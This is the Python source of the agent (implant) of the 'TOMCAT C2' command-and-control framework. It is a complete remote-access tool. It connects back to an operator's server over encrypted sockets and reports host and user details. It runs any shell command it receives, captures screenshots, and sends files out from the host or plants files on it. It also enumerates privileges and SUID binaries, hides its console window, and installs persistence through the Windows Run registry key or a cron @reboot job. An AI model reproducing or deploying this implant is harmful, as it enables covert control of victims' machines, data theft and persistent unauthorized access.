#!/usr/bin/python3
# TOMCAT C2 Frameworks
# Author: MatrixTM26
# GitHub: MatrixTM26

"""
[+] NOTE:
    -- Copying without owner permission is illegal.
    -- If you want to expand this project, ask owner for collaboration instead.

    Thanks for understanding.
    ~MatrixTM26
"""

import base64
import getpass
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import signal
import time

if platform.system() == "Windows":
    try:
        import winreg
    except ImportError:
        winreg = None
else:
    winreg = None

XBanner = """
                    <   TOMCAT C2 Frameworks Agent   />

"""


class TOMCATC2AGENT:
    def __init__(
        self,
        ServerHost,
        ServerPort,
        UseMTLS=False,
        HideConsole=False,
        AddPersistence=False,
        ShellMode="Standard",
        P12Path="agent.p12",
        P12Password="tomcat-c2",
        CAP12Path="ca.p12",
        CAP12Password="tomcat-c2",
    ):
        self.ServerHost = ServerHost
        self.ServerPort = ServerPort
        self.UseMTLS = UseMTLS
        self.HideConsole = HideConsole
        self.AddPersistence = AddPersistence
        self.ShellMode = ShellMode
        self.P12Path = P12Path
        self.P12Password = P12Password
        self.CAP12Path = CAP12Path
        self.CAP12Password = CAP12Password
        self.Socket = None
        self.Key = None
        self.Running = True
        self.CurrentProcess = None
        self.ProcessLock = threading.Lock()

    def HideConsoleWindow(self):
        if platform.system() == "Windows" and self.HideConsole:
            try:
                import ctypes

                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)
            except Exception:
                pass

    def SetupPersistence(self):
        if not self.AddPersistence:
            return
        try:
            if platform.system() == "Windows":
                self.WindowsPersistence()
            else:
                self.LinuxPersistence()
        except Exception as e:
            print(f"[-] Persistence Failed: {e}")

    def WindowsPersistence(self):
        try:
            import winreg

            ScriptPath = os.path.abspath(sys.argv[0])
            Key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(Key, "TOMCAT", 0, winreg.REG_SZ, f'python "{ScriptPath}"')
            winreg.CloseKey(Key)
            print("[+] Windows Persistence Added")
        except Exception as e:
            print(f"[-] Windows Persistence Error: {e}")

    def LinuxPersistence(self):
        try:
            ScriptPath = os.path.abspath(sys.argv[0])
            CronJob = f"@reboot /usr/bin/python3 {ScriptPath}\n"
            ExistingCrontab = ""
            try:
                Result = subprocess.run(
                    ["crontab", "-l"],
                    capture_output=True,
                    text=True,
                )
                if Result.returncode == 0:
                    ExistingCrontab = Result.stdout
            except Exception:
                pass
            if ScriptPath in ExistingCrontab:
                print("[*] Persistence already exists")
                return
            CrontabPath = os.path.expanduser("~/.config/tomcat_cron")
            os.makedirs(os.path.dirname(CrontabPath), exist_ok=True)
            with open(CrontabPath, "w") as F:
                F.write(ExistingCrontab)
                if ExistingCrontab and not ExistingCrontab.endswith("\n"):
                    F.write("\n")
                F.write(CronJob)
            os.system(f"crontab {CrontabPath}")
            try:
                os.remove(CrontabPath)
            except Exception:
                pass
            print("[+] Linux Persistence Added (Cron)")
        except Exception as e:
            print(f"[-] Linux Persistence Error: {e}")

    def GetLocalIP(self):
        try:
            S = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            S.connect(("8.8.8.8", 80))
            IP = S.getsockname()[0]
            S.close()
            return IP
        except Exception:
            return "Unknown"

    def LoadP12ToPEM(self, P12FilePath, Password=None):
        from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
        Pwd = Password.encode() if isinstance(Password, str) and Password else Password
        with open(P12FilePath, "rb") as F:
            Data = F.read()
        PrivKey, Cert, CACerts = pkcs12.load_key_and_certificates(Data, Pwd)
        return PrivKey, Cert, CACerts

    def SetupSSLContext(self):
        try:
            import ssl
            import tempfile
            from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption

            PrivKey, AgentCert, AgentCACerts = self.LoadP12ToPEM(self.P12Path, self.P12Password)
            _, CACert, CACACerts = self.LoadP12ToPEM(self.CAP12Path, self.CAP12Password)

            TmpAgent = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")
            TmpKey   = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")
            TmpCA    = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")

            TmpAgent.write(AgentCert.public_bytes(Encoding.PEM))
            if AgentCACerts:
                for C in AgentCACerts:
                    TmpAgent.write(C.public_bytes(Encoding.PEM))
            TmpAgent.close()

            TmpKey.write(PrivKey.private_bytes(Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()))
            TmpKey.close()

            if CACert:
                TmpCA.write(CACert.public_bytes(Encoding.PEM))
            if CACACerts:
                for C in CACACerts:
                    TmpCA.write(C.public_bytes(Encoding.PEM))
            TmpCA.close()

            Context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            Context.check_hostname = False
            Context.verify_mode = ssl.CERT_REQUIRED
            Context.load_verify_locations(cafile=TmpCA.name)
            Context.load_cert_chain(certfile=TmpAgent.name, keyfile=TmpKey.name)

            try:
                os.unlink(TmpAgent.name)
                os.unlink(TmpKey.name)
                os.unlink(TmpCA.name)
            except Exception:
                pass

            try:
                Context.minimum_version = ssl.TLSVersion.TLSv1_2
            except AttributeError:
                Context.options |= ssl.OP_NO_SSLv2
                Context.options |= ssl.OP_NO_SSLv3
                Context.options |= ssl.OP_NO_TLSv1
                Context.options |= ssl.OP_NO_TLSv1_1

            print("[+] MTLS Context Initialized (PKCS12)")
            return Context
        except Exception as e:
            print(f"[-] MTLS Context Error: {e}")
            return None

    def Connect(self):
        Attempts = 0
        MaxAttempts = 1000000
        while Attempts < MaxAttempts:
            try:
                print(f"[*] Connecting to {self.ServerHost}:{self.ServerPort}")
                if self.UseMTLS:
                    print("[*] MTLS Mode: Enabled")
                    SSLContext = self.SetupSSLContext()
                    if not SSLContext:
                        print("[-] Failed to setup MTLS context")
                        time.sleep(5)
                        Attempts += 1
                        continue
                    RawSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    RawSocket.settimeout(10)
                    RawSocket.connect((self.ServerHost, self.ServerPort))
                    self.Socket = SSLContext.wrap_socket(
                        RawSocket, server_hostname=self.ServerHost
                    )
                    print("[+] MTLS Connection Established")
                else:
                    self.Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.Socket.settimeout(10)
                    self.Socket.connect((self.ServerHost, self.ServerPort))
                print("[+] Connected to Server")
                return True
            except socket.timeout:
                print(f"[-] Connection timeout. Attempt {Attempts + 1}/{MaxAttempts}")
                time.sleep(5)
                Attempts += 1
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
                time.sleep(5)
                Attempts += 1
        return False

    def Handshake(self):
        try:
            print("[*] Starting handshake...")
            Info = {
                "os": platform.system(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "platform": platform.platform(),
                "architecture": platform.machine(),
                "pythonversion": platform.python_version(),
                "agentip": self.GetLocalIP(),
                "mtlsenabled": self.UseMTLS,
                "shellmode": self.ShellMode,
            }
            InfoJson = json.dumps(Info)
            self.Socket.sendall(InfoJson.encode())
            print("[+] System Info Sent")
            self.Socket.settimeout(10)
            KeyLine = b""
            while 10 not in KeyLine:
                Chunk = self.Socket.recv(256)
                if not Chunk:
                    print("[-] No Key Received")
                    return False
                KeyLine += Chunk
            self.Socket.settimeout(None)
            KeyB64 = KeyLine.strip()
            import base64
            self.Key = base64.urlsafe_b64decode(KeyB64 + b"==")
            print(f"[+] AES-256-GCM Key Received ({len(self.Key)} bytes)")
            print("[+] Handshake complete")
            return True
        except Exception as e:
            print(f"[-] Handshake Failed: {e}")
            return False

    def Encrypt(self, Data):
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        import os
        Raw = Data.encode() if isinstance(Data, str) else Data
        Iv = os.urandom(12)
        Cipher = AESGCM(self.Key)
        Encrypted = Cipher.encrypt(Iv, Raw, None)
        return Iv + Encrypted

    def Decrypt(self, Data):
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        Iv = Data[:12]
        Ciphertext = Data[12:]
        Cipher = AESGCM(self.Key)
        Decrypted = Cipher.decrypt(Iv, Ciphertext, None)
        return Decrypted.decode("utf-8")

    def TakeScreenshot(self):
        try:
            if platform.system() == "Linux":
                try:
                    subprocess.run(["which", "scrot"], check=True, capture_output=True)
                    Filename = f"/tmp/screenshot_{int(time.time())}.png"
                    Result = subprocess.run(["scrot", Filename], capture_output=True)
                    if Result.returncode == 0 and os.path.exists(Filename):
                        return Filename, "png"
                except Exception:
                    pass
                try:
                    subprocess.run(["which", "import"], check=True, capture_output=True)
                    Filename = f"/tmp/screenshot_{int(time.time())}.png"
                    Result = subprocess.run(
                        ["import", "-window", "root", Filename],
                        capture_output=True,
                    )
                    if Result.returncode == 0 and os.path.exists(Filename):
                        return Filename, "png"
                except Exception:
                    pass
            elif platform.system() == "Windows":
                try:
                    from PIL import ImageGrab

                    Filename = f"C:\\Windows\\Temp\\screenshot_{int(time.time())}.png"
                    Screenshot = ImageGrab.grab()
                    Screenshot.save(Filename, "PNG")
                    return Filename, "png"
                except Exception:
                    pass
            elif platform.system() == "Darwin":
                try:
                    Filename = f"/tmp/screenshot_{int(time.time())}.png"
                    Result = subprocess.run(
                        ["screencapture", "-x", Filename],
                        capture_output=True,
                    )
                    if Result.returncode == 0 and os.path.exists(Filename):
                        return Filename, "png"
                except Exception:
                    pass
            return None, None
        except Exception:
            return None, None

    def DownloadFile(self, Filepath):
        try:
            if not os.path.exists(Filepath):
                return None, None, "File not found"
            if not os.path.isfile(Filepath):
                return None, None, "Path is not a file"
            Filename = os.path.basename(Filepath)
            with open(Filepath, "rb") as F:
                FileData = F.read()
            return Filename, FileData, None
        except Exception as e:
            return None, None, f"Error: {str(e)}"

    def UploadFile(self, Filepath, FileData):
        try:
            Directory = os.path.dirname(Filepath)
            if Directory and not os.path.exists(Directory):
                os.makedirs(Directory, exist_ok=True)
            with open(Filepath, "wb") as F:
                F.write(FileData)
            return f"File uploaded successfully: {Filepath} ({len(FileData)} bytes)"
        except Exception as e:
            return f"Upload error: {str(e)}"

    def SendFile(self, Filename, FileData):
        try:
            FileSize = len(FileData)
            Extension = os.path.splitext(Filename)[1] or ".bin"
            Metadata = json.dumps(
                {
                    "type": "file",
                    "filename": Filename,
                    "size": FileSize,
                    "extension": Extension,
                }
            )
            MetadataEncrypted = self.Encrypt(Metadata)
            MetadataPacket = MetadataEncrypted + b"<META>"
            self.Socket.sendall(MetadataPacket)
            time.sleep(0.1)
            self.Socket.sendall(FileData)
            self.Socket.sendall(b"<END>")
            print(f"[+] File sent: {Filename} ({FileSize} bytes)")
            return True
        except Exception as e:
            print(f"[!] SendFile error: {e}")
            return False

    def ReceiveFile(self):
        try:
            print("[*] Receiving file from server...")
            MetaData = b""
            Remainder = b""
            StartTime = time.time()
            self.Socket.settimeout(30.0)
            try:
                while True:
                    if time.time() - StartTime > 30:
                        print("[!] ReceiveFile: Metadata timeout")
                        return None, None
                    try:
                        Chunk = self.Socket.recv(4096)
                        if not Chunk:
                            print("[!] ReceiveFile: Connection lost")
                            return None, None
                        MetaData += Chunk
                        if b"<META>" in MetaData:
                            Parts = MetaData.split(b"<META>", 1)
                            MetaData = Parts[0]
                            Remainder = Parts[1] if len(Parts) > 1 else b""
                            break
                    except socket.timeout:
                        continue
                MetadataDecrypted = self.Decrypt(MetaData)
                Metadata = json.loads(MetadataDecrypted)
                Filename = Metadata.get("filename", "uploaded_file")
                FileSize = Metadata.get("size", 0)
                print(f"[*] Receiving: {Filename} ({FileSize} bytes)")
                FileData = Remainder
                StartTime = time.time()
                LastRecvTime = time.time()
                self.Socket.settimeout(10.0)
                while True:
                    if time.time() - StartTime > 300:
                        print("[!] ReceiveFile: Transfer timeout")
                        return None, None
                    if time.time() - LastRecvTime > 30 and FileData:
                        break
                    try:
                        Chunk = self.Socket.recv(32768)
                        if not Chunk:
                            break
                        FileData += Chunk
                        LastRecvTime = time.time()
                        if b"<END>" in FileData:
                            FileData = FileData.split(b"<END>", 1)[0]
                            break
                    except socket.timeout:
                        if b"<END>" in FileData:
                            FileData = FileData.split(b"<END>", 1)[0]
                            break
                        continue
                if not FileData:
                    print("[!] ReceiveFile: No data")
                    return None, None
                print(f"[+] File received: {Filename} ({len(FileData)} bytes)")
                return Filename, FileData
            finally:
                self.Socket.settimeout(None)
        except Exception as e:
            print(f"[!] ReceiveFile error: {e}")
            try:
                self.Socket.settimeout(None)
            except Exception:
                pass
            return None, None

    def CheckPrivileges(self):
        try:
            Info = []
            CurrentUser = getpass.getuser()
            Info.append(f"Current User: {CurrentUser}")
            Info.append(f"Process ID: {os.getpid()}")
            Info.append(f"Working Directory: {os.getcwd()}")

            if platform.system() == "Windows":
                try:
                    import ctypes

                    IsAdmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if IsAdmin:
                        Info.append("Privilege Level: Administrator (Elevated)")
                    else:
                        Info.append("Privilege Level: Standard User (Not Elevated)")
                except Exception:
                    Info.append("Privilege Level: Unable to determine")
                try:
                    Result = subprocess.run(
                        "whoami /priv",
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10,
                    )
                    if Result.stdout.strip():
                        Info.append("")
                        Info.append("Token Privileges:")
                        Info.append(Result.stdout.strip())
                except Exception:
                    pass
                try:
                    Result = subprocess.run(
                        "whoami /groups",
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10,
                    )
                    if Result.stdout.strip():
                        Info.append("")
                        Info.append("Group Memberships:")
                        Info.append(Result.stdout.strip())
                except Exception:
                    pass

            else:
                Uid = os.getuid()
                Gid = os.getgid()
                Euid = os.geteuid()
                Egid = os.getegid()
                Info.append(f"UID: {Uid}")
                Info.append(f"GID: {Gid}")
                Info.append(f"EUID: {Euid}")
                Info.append(f"EGID: {Egid}")
                if Euid == 0:
                    Info.append("Privilege Level: ROOT (Full Privileges)")
                else:
                    Info.append("Privilege Level: Standard User (Not Root)")
                try:
                    Result = subprocess.run(
                        ["id"],
                        capture_output=True,
                        text=True,
                        timeout=10,
                    )
                    if Result.stdout.strip():
                        Info.append(f"ID Info: {Result.stdout.strip()}")
                except Exception:
                    pass
                try:
                    Result = subprocess.run(
                        ["sudo", "-l", "-n"],
                        capture_output=True,
                        text=True,
                        timeout=5,
                    )
                    if Result.stdout.strip():
                        Info.append("")
                        Info.append("Sudo Privileges:")
                        Info.append(Result.stdout.strip())
                    elif Result.stderr.strip():
                        Info.append(f"Sudo Check: {Result.stderr.strip()}")
                except Exception:
                    Info.append("Sudo Check: Unable to determine")
                try:
                    SuidCheck = subprocess.run(
                        [
                            "find",
                            "/usr/bin",
                            "/usr/sbin",
                            "-perm",
                            "-4000",
                            "-type",
                            "f",
                        ],
                        capture_output=True,
                        text=True,
                        timeout=10,
                    )
                    if SuidCheck.stdout.strip():
                        SuidFiles = SuidCheck.stdout.strip().split("\n")
                        Info.append("")
                        Info.append(f"SUID Binaries Found: {len(SuidFiles)}")
                        for F in SuidFiles[:15]:
                            Info.append(f"  {F}")
                        if len(SuidFiles) > 15:
                            Info.append(f"  ... and {len(SuidFiles) - 15} more")
                except Exception:
                    pass

            return "\n".join(Info)
        except Exception as e:
            return f"Elevate check error: {str(e)}"

    def ExecCommand(self, Command):
        try:
            CommandUpper = Command.strip().upper()
            CommandLower = Command.strip().lower()

            if CommandUpper == "STOPTASK":
                return self.StopCurrentTask()

            if CommandUpper in ["SYSINFO", "SYSTEMINFO", "SYSINFO:"]:
                Info = {
                    "OS": platform.system(),
                    "OS Version": platform.version(),
                    "Platform": platform.platform(),
                    "Hostname": platform.node(),
                    "User": getpass.getuser(),
                    "Architecture": platform.machine(),
                    "Processor": platform.processor(),
                    "Python Version": platform.python_version(),
                    "Agent IP": self.GetLocalIP(),
                    "MTLS Enabled": self.UseMTLS,
                    "Shell Mode": self.ShellMode,
                }
                Result = "\n".join([f"{K}: {V}" for K, V in Info.items()])
                return Result

            if CommandLower.startswith("cd "):
                NewDir = Command[3:].strip()
                try:
                    os.chdir(NewDir)
                    return f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    return f"cd failed: {str(e)}"

            if CommandLower in ["elevate", "elevate:"]:
                return self.CheckPrivileges()

            if CommandUpper == "SCREENSHOT":
                ScreenshotPath, Extension = self.TakeScreenshot()
                if ScreenshotPath:
                    with open(ScreenshotPath, "rb") as F:
                        FileData = F.read()
                    Filename = f"screenshot_{int(time.time())}.{Extension}"
                    self.SendFile(Filename, FileData)
                    try:
                        os.remove(ScreenshotPath)
                    except Exception:
                        pass
                    return "FILE_SENT"
                return "Screenshot failed - no capture tool available"

            if CommandLower.startswith("download") or CommandLower.startswith("dl"):
                Parts = Command.split(maxsplit=1)
                if len(Parts) < 2:
                    return "Usage: download <filepath>"
                Filepath = Parts[1].strip().lstrip(":").strip()
                if not Filepath:
                    return "Usage: download <filepath>"
                Filename, FileData, Error = self.DownloadFile(Filepath)
                if Error:
                    return Error
                self.SendFile(Filename, FileData)
                return "FILE_SENT"

            if CommandLower.startswith("upload"):
                Parts = Command.split(maxsplit=1)
                if len(Parts) < 2:
                    return "Usage: upload <filepath>"
                Filepath = Parts[1].strip().lstrip(":").strip()
                if not Filepath:
                    return "Usage: upload <filepath>"
                Filename, FileData = self.ReceiveFile()
                if Filename is None or FileData is None:
                    return "Upload failed - no file received"
                Result = self.UploadFile(Filepath, FileData)
                return Result

            with self.ProcessLock:
                if platform.system() != "Windows":
                    self.CurrentProcess = subprocess.Popen(
                        Command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        preexec_fn=os.setsid,
                    )
                else:
                    self.CurrentProcess = subprocess.Popen(
                        Command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
            try:
                Stdout, Stderr = self.CurrentProcess.communicate(timeout=60)
            except subprocess.TimeoutExpired:
                self.StopCurrentTask()
                return "Command Timeout (60s)"
            with self.ProcessLock:
                self.CurrentProcess = None
            Output = Stdout + Stderr
            Result = (
                Output.decode(errors="ignore")
                if Output.strip()
                else "Command Executed Successfully (No Output)"
            )
            return Result
        except Exception as e:
            with self.ProcessLock:
                self.CurrentProcess = None
            return f"Error: {str(e)}"

    def StopCurrentTask(self):
        with self.ProcessLock:
            if self.CurrentProcess is None:
                return "No task currently running"
            try:
                Pid = self.CurrentProcess.pid
                if platform.system() != "Windows":
                    try:
                        os.killpg(os.getpgid(Pid), signal.SIGTERM)
                        time.sleep(0.3)
                        try:
                            os.killpg(os.getpgid(Pid), 0)
                            os.killpg(os.getpgid(Pid), signal.SIGKILL)
                        except ProcessLookupError:
                            pass
                    except Exception:
                        pass
                else:
                    subprocess.run(
                        f"taskkill /F /T /PID {Pid}",
                        shell=True,
                        capture_output=True,
                    )
                self.CurrentProcess = None
                return "Task stopped successfully"
            except Exception as e:
                return f"Failed to stop task: {str(e)}"

    def MainLoop(self):
        print("[*] Entering main loop...")
        while self.Running:
            try:
                self.Socket.settimeout(None)
                EncryptedCommand = self.Socket.recv(8192)
                if not EncryptedCommand:
                    print("[-] Connection Lost")
                    break
                Command = self.Decrypt(EncryptedCommand)
                print(f"[+] Command: {Command}")
                Output = self.ExecCommand(Command)
                if Output == "FILE_SENT":
                    continue
                EncryptedOutput = self.Encrypt(Output)
                OutputWithMarker = EncryptedOutput + b"<END>"
                if len(OutputWithMarker) > 32768:
                    ChunkSize = 16384
                    TotalSent = 0
                    while TotalSent < len(OutputWithMarker):
                        Chunk = OutputWithMarker[TotalSent : TotalSent + ChunkSize]
                        self.Socket.sendall(Chunk)
                        TotalSent += len(Chunk)
                        time.sleep(0.01)
                else:
                    self.Socket.sendall(OutputWithMarker)
                time.sleep(0.1)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[-] Error in MainLoop: {e}")
                break
        print("[*] Agent Stopped")
        if self.Socket:
            try:
                self.Socket.close()
            except Exception:
                pass

    def Run(self):
        print(XBanner)
        ModeStr = "TOMCAT C2 AGENT"
        if self.UseMTLS:
            ModeStr += " (MTLS)"
        print(ModeStr)
        self.HideConsoleWindow()
        self.SetupPersistence()
        while True:
            if self.Connect():
                if self.Handshake():
                    self.MainLoop()
            print("[-] Reconnecting in 5 seconds...")
            time.sleep(5)


ServerHost = "0.0.0.0"
ServerPort = 4444
UseMTLS = True
HideConsole = False
AddPersistence = False
P12Path = "agent.p12"
P12Password = "tomcat-c2"
CAP12Path = "ca.p12"
CAP12Password = "tomcat-c2"

if __name__ == "__main__":
    Agent = TOMCATC2AGENT(
        ServerHost=ServerHost,
        ServerPort=ServerPort,
        UseMTLS=UseMTLS,
        HideConsole=HideConsole,
        AddPersistence=AddPersistence,
        P12Path=P12Path,
        P12Password=P12Password,
        CAP12Path=CAP12Path,
        CAP12Password=CAP12Password,
    )
    Agent.Run()
